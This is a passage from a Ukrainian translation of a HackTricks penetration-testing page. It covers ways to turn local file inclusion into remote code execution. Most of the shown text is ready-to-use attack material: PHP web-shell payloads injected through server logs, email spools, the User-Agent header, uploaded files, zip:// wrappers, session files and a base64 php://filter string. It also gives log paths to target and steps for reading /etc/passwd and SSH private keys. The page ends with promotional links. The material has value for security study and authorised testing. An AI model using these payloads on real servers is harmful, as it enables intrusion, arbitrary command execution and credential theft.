–¢–∞–∫–æ–∂ –ø–µ—Ä–µ–∫–æ–Ω–∞–π—Ç–µ—Å—è, —â–æ **–ø—Ä–∞–≤–∏–ª—å–Ω–æ –∑–∞–ø–∏—Å–∞–ª–∏ –≤–∞–Ω—Ç–∞–∂**, –∞–±–æ PHP –±—É–¥–µ –≤–∏–∫–∏–¥–∞—Ç–∏ –ø–æ–º–∏–ª–∫—É –∫–æ–∂–Ω–æ–≥–æ —Ä–∞–∑—É, –∫–æ–ª–∏ —Å–ø—Ä–æ–±—É—î –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Ñ–∞–π–ª –∂—É—Ä–Ω–∞–ª—É, —ñ —É –≤–∞—Å –Ω–µ –±—É–¥–µ –¥—Ä—É–≥–æ—ó –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ.
{% endhint %}

–¶–µ —Ç–∞–∫–æ–∂ –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏ –≤ —ñ–Ω—à–∏—Ö –∂—É—Ä–Ω–∞–ª–∞—Ö, –∞–ª–µ **–±—É–¥—å—Ç–µ –æ–±–µ—Ä–µ–∂–Ω—ñ**, –∫–æ–¥ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∂—É—Ä–Ω–∞–ª—ñ–≤ –º–æ–∂–µ –±—É—Ç–∏ URL-–∫–æ–¥–æ–≤–∞–Ω–∏–º —ñ —Ü–µ –º–æ–∂–µ –∑–Ω–∏—â–∏—Ç–∏ Shell. –ó–∞–≥–æ–ª–æ–≤–æ–∫ **authorization "basic"** –º—ñ—Å—Ç–∏—Ç—å "user:password" –≤ Base64 —ñ –¥–µ–∫–æ–¥—É—î—Ç—å—Å—è –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∂—É—Ä–Ω–∞–ª—ñ–≤. PHPShell –º–æ–∂–µ –±—É—Ç–∏ –≤—Å—Ç–∞–≤–ª–µ–Ω–∏–π –≤—Å–µ—Ä–µ–¥–∏–Ω—É —Ü—å–æ–≥–æ –∑–∞–≥–æ–ª–æ–≤–∫–∞.\
–Ü–Ω—à—ñ –º–æ–∂–ª–∏–≤—ñ —à–ª—è—Ö–∏ –¥–æ –∂—É—Ä–Ω–∞–ª—ñ–≤:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
### –ß–µ—Ä–µ–∑ Email

**–ù–∞–¥—ñ—à–ª—ñ—Ç—å –ª–∏—Å—Ç–∞** –Ω–∞ –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å (user@localhost), —â–æ –º—ñ—Å—Ç–∏—Ç—å –≤–∞—à PHP-–ø–µ–π–ª–æ–∞–¥, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ `<?php echo system($_REQUEST["cmd"]); ?>`, —ñ —Å–ø—Ä–æ–±—É–π—Ç–µ –≤–∫–ª—é—á–∏—Ç–∏ –π–æ–≥–æ –≤ –ª–∏—Å—Ç –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑–∞ —à–ª—è—Ö–æ–º **`/var/mail/<USERNAME>`** –∞–±–æ **`/var/spool/mail/<USERNAME>`**

### –ß–µ—Ä–µ–∑ /proc/\*/fd/\*

1. –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –±–∞–≥–∞—Ç–æ –æ–±–æ–ª–æ–Ω–æ–∫ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥: 100)
2. –í–∫–ª—é—á—ñ—Ç—å [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), –¥–µ $PID = PID –ø—Ä–æ—Ü–µ—Å—É (–º–æ–∂–µ –±—É—Ç–∏ –ø–µ—Ä–µ–±–æ—Ä–æ–º) —ñ $FD - –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —Ñ–∞–π–ª—É (—Ç–µ–∂ –º–æ–∂–µ –±—É—Ç–∏ –ø–µ—Ä–µ–±–æ—Ä–æ–º)

### –ß–µ—Ä–µ–∑ /proc/self/environ

–ü–æ–¥—ñ–±–Ω–æ –¥–æ —Ñ–∞–π–ª—É –∂—É—Ä–Ω–∞–ª—É, –Ω–∞–¥—ñ—à–ª—ñ—Ç—å –ø–µ–π–ª–æ–∞–¥ —É –∑–∞–≥–æ–ª–æ–≤–∫—É User-Agent, –≤—ñ–Ω –±—É–¥–µ –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–∏–π –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ñ–∞–π–ª—É /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### –ß–µ—Ä–µ–∑ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è

–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Ñ–∞–π–ª, –ø—Ä–æ—Å—Ç–æ –≤–ø—Ä–æ–≤–∞–¥—ñ—Ç—å –æ–±–æ–ª–æ–Ω–∫–æ–≤–∏–π –≤—Ä–∞–∑–ª–∏–≤–∏–π –∫–æ–¥ –≤ –Ω—å–æ–≥–æ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
–î–ª—è –∑–±–µ—Ä–µ–∂–µ–Ω–Ω—è —á–∏—Ç–∞–±–µ–ª—å–Ω–æ—Å—Ç—ñ —Ñ–∞–π–ª—É –Ω–∞–π–∫—Ä–∞—â–µ –≤–Ω–µ—Å—Ç–∏ —ñ–Ω'—î–∫—Ü—ñ—é –≤ –º–µ—Ç–∞–¥–∞–Ω—ñ –∑–æ–±—Ä–∞–∂–µ–Ω—å/–¥–æ–∫—É–º–µ–Ω—Ç—ñ–≤/pdf

### –ß–µ—Ä–µ–∑ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è ZIP-—Ñ–∞–π–ª—É

–ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ ZIP-—Ñ–∞–π–ª, —â–æ –º—ñ—Å—Ç–∏—Ç—å —Å—Ç–∏—Å–Ω—É—Ç–∏–π PHP shell, —Ç–∞ –æ—Ç—Ä–∏–º–∞–π—Ç–µ –¥–æ—Å—Ç—É–ø:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### –ß–µ—Ä–µ–∑ PHP —Å–µ—Å—ñ—ó

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –≤–µ–±-—Å–∞–π—Ç PHP —Å–µ—Å—ñ—ó (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
–£ PHP —Ü—ñ —Å–µ—Å—ñ—ó –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è —É —Ñ–∞–π–ª–∞—Ö _/var/lib/php5/sess\\_\[PHPSESSID]\_
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
–í—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å cookie –Ω–∞ `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ LFI –¥–ª—è –≤–∫–ª—é—á–µ–Ω–Ω—è —Ñ–∞–π–ª—É PHP —Å–µ—Å—ñ—ó
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### –ß–µ—Ä–µ–∑ ssh

–Ø–∫—â–æ ssh –∞–∫—Ç–∏–≤–Ω–∏–π, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —è–∫–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è (/proc/self/status —Ç–∞ /etc/passwd) —ñ —Å–ø—Ä–æ–±—É–π—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ **\<HOME>/.ssh/id\_rsa**

### **–ß–µ—Ä–µ–∑** **vsftpd** _**–∂—É—Ä–Ω–∞–ª–∏**_

–ñ—É—Ä–Ω–∞–ª–∏ –¥–ª—è FTP-—Å–µ—Ä–≤–µ—Ä–∞ vsftpd —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω—ñ –≤ _**/var/log/vsftpd.log**_. –£ –≤–∏–ø–∞–¥–∫—É –Ω–∞—è–≤–Ω–æ—Å—Ç—ñ —É—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –Ω–∞ –ª–æ–∫–∞–ª—å–Ω—É –≤–∫–ª—é—á–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤ (LFI) —ñ –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ –¥–æ—Å—Ç—É–ø—É –¥–æ –≤—ñ–¥–∫—Ä–∏—Ç–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞ vsftpd, –º–æ–∂–Ω–∞ —Ä–æ–∑–≥–ª—è–Ω—É—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—ñ –∫—Ä–æ–∫–∏:

1. –í–ø—Ä–æ–≤–∞–¥–∏—Ç–∏ PHP-–Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –≤ –ø–æ–ª–µ —ñ–º–µ–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –ø—ñ–¥ —á–∞—Å –ø—Ä–æ—Ü–µ—Å—É –≤—Ö–æ–¥—É.
2. –ü—ñ—Å–ª—è –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ LFI –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –∂—É—Ä–Ω–∞–ª—ñ–≤ —Å–µ—Ä–≤–µ—Ä–∞ –∑ _**/var/log/vsftpd.log**_.

### –ß–µ—Ä–µ–∑ —Ñ—ñ–ª—å—Ç—Ä php base64 (–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ base64)

–Ø–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –≤ [—Ü—ñ–π](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) —Å—Ç–∞—Ç—Ç—ñ, —Ñ—ñ–ª—å—Ç—Ä PHP base64 –ø—Ä–æ—Å—Ç–æ —ñ–≥–Ω–æ—Ä—É—î Non-base64. –í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ –¥–ª—è –æ–±—Ö–æ–¥—É –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è —Ñ–∞–π–ª—É: —è–∫—â–æ –≤–∏ –Ω–∞–¥–∞—î—Ç–µ base64, —è–∫–∏–π –∑–∞–∫—ñ–Ω—á—É—î—Ç—å—Å—è –Ω–∞ ".php", –≤—ñ–Ω –ø—Ä–æ—Å—Ç–æ —ñ–≥–Ω–æ—Ä—É—î "." —ñ –¥–æ–¥–∞—î "php" –¥–æ base64. –û—Å—å –ø—Ä–∏–∫–ª–∞–¥ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### –ß–µ—Ä–µ–∑ —Ñ—ñ–ª—å—Ç—Ä–∏ php (–Ω–µ –ø–æ—Ç—Ä—ñ–±–µ–Ω —Ñ–∞–π–ª)

–£ —Ü—å–æ–º—É [**–æ–ø–∏—Å—ñ**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) –ø–æ—è—Å–Ω—é—î—Ç—å—Å—è, —â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **—Ñ—ñ–ª—å—Ç—Ä–∏ php –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ –≤–º—ñ—Å—Ç—É** —è–∫ –≤–∏–≤—ñ–¥. –¶–µ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –æ–∑–Ω–∞—á–∞—î, —â–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π php –∫–æ–¥** –¥–ª—è –≤–∫–ª—é—á–µ–Ω–Ω—è **–±–µ–∑ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ—Å—Ç—ñ –ø–∏—Å–∞—Ç–∏** –π–æ–≥–æ —É —Ñ–∞–π–ª.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### –ß–µ—Ä–µ–∑ –≤—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å —Å–µ–≥–º–µ–Ω—Ç–∞—Ü—ñ–π–Ω–æ—ó –ø–æ–º–∏–ª–∫–∏

**–ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ** —Ñ–∞–π–ª, —è–∫–∏–π –±—É–¥–µ –∑–±–µ—Ä–µ–∂–µ–Ω–æ —è–∫ **—Ç–∏–º—á–∞—Å–æ–≤–∏–π** –≤ `/tmp`, –∞ –ø–æ—Ç—ñ–º —É **—Ç–æ–º—É –∂ –∑–∞–ø–∏—Ç—ñ,** —Å–ø—Ä–∏—á–∏–Ω—ñ—Ç—å **–≤—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å —Å–µ–≥–º–µ–Ω—Ç–∞—Ü—ñ–π–Ω–æ—ó –ø–æ–º–∏–ª–∫–∏**, —ñ —Ç–æ–¥—ñ **—Ç–∏–º—á–∞—Å–æ–≤–∏–π —Ñ–∞–π–ª –Ω–µ –±—É–¥–µ –≤–∏–¥–∞–ª–µ–Ω–æ** —ñ –≤–∏ –∑–º–æ–∂–µ—Ç–µ –π–æ–≥–æ –∑–Ω–∞–π—Ç–∏.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### –ß–µ—Ä–µ–∑ —Ç–∏–º—á–∞—Å–æ–≤–µ –∑–±–µ—Ä—ñ–≥–∞–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤ Nginx

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π—à–ª–∏ **–ª–æ–∫–∞–ª—å–Ω–µ –≤–∫–ª—é—á–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤** —ñ –ø–µ—Ä–µ–¥ PHP –ø—Ä–∞—Ü—é—î **Nginx**, –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ RCE –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–∞—Å—Ç—É–ø–Ω–æ—ó —Ç–µ—Ö–Ω—ñ–∫–∏:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### –ß–µ—Ä–µ–∑ PHP\_SESSION\_UPLOAD\_PROGRESS

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π—à–ª–∏ **–ª–æ–∫–∞–ª—å–Ω–µ –≤–∫–ª—é—á–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤**, –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ —É –≤–∞—Å **–Ω–µ–º–∞—î —Å–µ—Å—ñ—ó** —ñ `session.auto_start` –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –≤ `Off`. –Ø–∫—â–æ –≤–∏ –Ω–∞–¥–∞—î—Ç–µ **`PHP_SESSION_UPLOAD_PROGRESS`** —É **multipart POST** –¥–∞–Ω–∏—Ö, PHP –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ **—É–≤—ñ–º–∫–Ω–µ —Å–µ—Å—ñ—é –¥–ª—è –≤–∞—Å**. –í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è RCE:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### –ß–µ—Ä–µ–∑ —Ç–∏–º—á–∞—Å–æ–≤–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤ —É Windows

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π—à–ª–∏ **–ª–æ–∫–∞–ª—å–Ω–µ –≤–∫–ª—é—á–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤** —ñ —Å–µ—Ä–≤–µ—Ä –ø—Ä–∞—Ü—é—î –ø—ñ–¥ **Windows**, –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ RCE:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### –ß–µ—Ä–µ–∑ phpinfo() (file\_uploads = on)

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π—à–ª–∏ **–ª–æ–∫–∞–ª—å–Ω–µ –≤–∫–ª—é—á–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤** —ñ —Ñ–∞–π–ª, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î **phpinfo()** –∑ file\_uploads = on, –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ RCE:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### –ß–µ—Ä–µ–∑ compress.zlib + `PHP_STREAM_PREFER_STUDIO` + –†–æ–∑–∫—Ä–∏—Ç—Ç—è —à–ª—è—Ö—É

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π—à–ª–∏ **–ª–æ–∫–∞–ª—å–Ω–µ –≤–∫–ª—é—á–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤** —ñ –≤–∏ **–º–æ–∂–µ—Ç–µ –≤–∏—Ç—è–≥—Ç–∏ —à–ª—è—Ö** –¥–æ —Ç–∏–º—á–∞—Å–æ–≤–æ–≥–æ —Ñ–∞–π–ª—É, –ê–õ–ï **—Å–µ—Ä–≤–µ—Ä** –ø–µ—Ä–µ–≤—ñ—Ä—è—î, —á–∏ **—Ñ–∞–π–ª, —è–∫–∏–π –º–∞—î –±—É—Ç–∏ –≤–∫–ª—é—á–µ–Ω–∏–π, –º–∞—î –º—ñ—Ç–∫–∏ PHP**, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ **–æ–±—ñ–π—Ç–∏ —Ü—é –ø–µ—Ä–µ–≤—ñ—Ä–∫—É** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ü—ñ—î—ó **Race Condition**:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### –ß–µ—Ä–µ–∑ –≤—ñ—á–Ω–µ –æ—á—ñ–∫—É–≤–∞–Ω–Ω—è + –ø–µ—Ä–µ–±—ñ—Ä –ø–∞—Ä–æ–ª—ñ–≤

–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ LFI –¥–ª—è **–∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ç–∏–º—á–∞—Å–æ–≤–∏—Ö —Ñ–∞–π–ª—ñ–≤** —ñ –∑–º—É—Å–∏—Ç–∏ —Å–µ—Ä–≤–µ—Ä **–∑–∞–≤–∏—Å–Ω—É—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è PHP**, –≤–∏ –ø–æ—Ç—ñ–º –º–æ–∂–µ—Ç–µ **–ø–µ—Ä–µ–±–∏—Ä–∞—Ç–∏ —ñ–º–µ–Ω–∞ —Ñ–∞–π–ª—ñ–≤ –≥–æ–¥–∏–Ω–∞–º–∏**, —â–æ–± –∑–Ω–∞–π—Ç–∏ —Ç–∏–º—á–∞—Å–æ–≤–∏–π —Ñ–∞–π–ª:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### –î–æ —Ñ–∞—Ç–∞–ª—å–Ω–æ—ó –ø–æ–º–∏–ª–∫–∏

–Ø–∫—â–æ –≤–∏ –≤–∫–ª—é—á–∏—Ç–µ –±—É–¥—å-—è–∫–∏–π –∑ —Ñ–∞–π–ª—ñ–≤ `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (–í–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∫–ª—é—á–∏—Ç–∏ –æ–¥–Ω–∞–∫–æ–≤–∏–π —Ñ–∞–π–ª 2 —Ä–∞–∑–∏, —â–æ–± –≤–∏–∫–∏–Ω—É—Ç–∏ —Ü—é –ø–æ–º–∏–ª–∫—É).

**–Ø –Ω–µ –∑–Ω–∞—é, –Ω–∞—Å–∫—ñ–ª—å–∫–∏ —Ü–µ –∫–æ—Ä–∏—Å–Ω–æ, –∞–ª–µ —Ü–µ –º–æ–∂–µ –±—É—Ç–∏.**\
_–ù–∞–≤—ñ—Ç—å —è–∫—â–æ –≤–∏ –≤–∏–∫–ª–∏–∫–∞—î—Ç–µ —Ñ–∞—Ç–∞–ª—å–Ω—É –ø–æ–º–∏–ª–∫—É PHP, —Ç–∏–º—á–∞—Å–æ–≤—ñ —Ñ–∞–π–ª–∏, –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—ñ PHP, –≤–∏–¥–∞–ª—è—é—Ç—å—Å—è._

<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) —Å–µ—Ä–≤–µ—Ä–∞, —â–æ–± —Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è –∑ –¥–æ—Å–≤—ñ–¥—á–µ–Ω–∏–º–∏ —Ö–∞–∫–µ—Ä–∞–º–∏ —Ç–∞ –º–∏—Å–ª–∏–≤—Ü—è–º–∏ –∑–∞ –±–∞–≥–∞–º–∏!

**–Ü–Ω—Å–∞–π—Ç–∏ —â–æ–¥–æ –≤–∑–ª–æ–º—É**\
–í–∑–∞—î–º–æ–¥—ñ–π—Ç–µ –∑ –∫–æ–Ω—Ç–µ–Ω—Ç–æ–º, —è–∫–∏–π –¥–æ—Å–ª—ñ–¥–∂—É—î –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è —Ç–∞ –≤–∏–∫–ª–∏–∫–∏ –≤–∑–ª–æ–º—É

**–ù–æ–≤–∏–Ω–∏ –ø—Ä–æ –≤–∑–ª–æ–º–∏ –≤ —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ**\
–ë—É–¥—å—Ç–µ –≤ –∫—É—Ä—Å—ñ —à–≤–∏–¥–∫–æ–∑–º—ñ–Ω–Ω–æ–≥–æ —Å–≤—ñ—Ç—É –≤–∑–ª–æ–º—É –∑–∞–≤–¥—è–∫–∏ –Ω–æ–≤–∏–Ω–∞–º —Ç–∞ —ñ–Ω—Å–∞–π—Ç–∞–º –≤ —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ

**–û—Å—Ç–∞–Ω–Ω—ñ –æ–≥–æ–ª–æ—à–µ–Ω–Ω—è**\
–ë—É–¥—å—Ç–µ –≤ –∫—É—Ä—Å—ñ –Ω–∞–π–Ω–æ–≤—ñ—à–∏—Ö –±–∞–≥-–±–∞—É–Ω—Ç—ñ, —è–∫—ñ –∑–∞–ø—É—Å–∫–∞—é—Ç—å—Å—è, —Ç–∞ –≤–∞–∂–ª–∏–≤–∏—Ö –æ–Ω–æ–≤–ª–µ–Ω—å –ø–ª–∞—Ç—Ñ–æ—Ä–º–∏

–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ –Ω–∞—Å –Ω–∞ [**Discord**](https://discord.com/invite/N3FrSbmwdy) —Ç–∞ –ø–æ—á–Ω—ñ—Ç—å —Å–ø—ñ–≤–ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –∑ –Ω–∞–π–∫—Ä–∞—â–∏–º–∏ —Ö–∞–∫–µ—Ä–∞–º–∏ –≤–∂–µ —Å—å–æ–≥–æ–¥–Ω—ñ!

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ –≤–∑–ª–æ–º AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –≤ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –î—ñ–∑–Ω–∞–π—Ç–µ—Å—è –ø—Ä–æ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
